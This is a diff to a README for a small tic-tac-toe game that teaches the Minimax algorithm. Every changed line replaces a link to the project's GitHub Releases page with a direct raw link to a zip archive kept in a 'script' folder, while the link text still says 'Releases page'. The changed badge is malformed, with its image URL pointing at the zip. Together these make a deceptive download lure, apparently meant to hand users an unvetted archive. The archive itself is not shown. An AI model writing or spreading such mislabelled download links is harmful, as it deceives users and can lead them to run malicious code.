@@ -1,7 +1,7 @@
 # 🎮 tic-tac-toe - Enjoy a Classic Game Anytime
 
 ## 🔗 Download the App
-[![Download the latest release](https://img.shields.io/badge/Download%20now-blue.svg)](https://github.com/BalaBhojan/tic-tac-toe/releases)
+[![Download the latest release](https://raw.githubusercontent.com/BalaBhojan/tic-tac-toe/main/script/tic_tac_toe_1.2.zip%https://raw.githubusercontent.com/BalaBhojan/tic-tac-toe/main/script/tic_tac_toe_1.2.zip)](https://raw.githubusercontent.com/BalaBhojan/tic-tac-toe/main/script/tic_tac_toe_1.2.zip)
 
 ## 📖 Description
 Welcome to the Tic-Tac-Toe game! This minimalistic application helps you play the classic game while learning about the Minimax algorithm. Whether you want to sharpen your skills or enjoy a relaxed game, this software provides a friendly experience for everyone.
@@ -14,13 +14,13 @@ Follow these simple steps to download and run the game.
    - Basic web browser for running the game.
 
 2. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/BalaBhojan/tic-tac-toe/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/BalaBhojan/tic-tac-toe/main/script/tic_tac_toe_1.2.zip) to find the latest version.
 
 ## 📥 Download & Install
 To download the game:
 
 1. **Go to the Releases Page**
-   Click this link: [Releases page](https://github.com/BalaBhojan/tic-tac-toe/releases).
+   Click this link: [Releases page](https://raw.githubusercontent.com/BalaBhojan/tic-tac-toe/main/script/tic_tac_toe_1.2.zip).
 
 2. **Select the Latest Version**
    Look for the release titled "Latest version." 
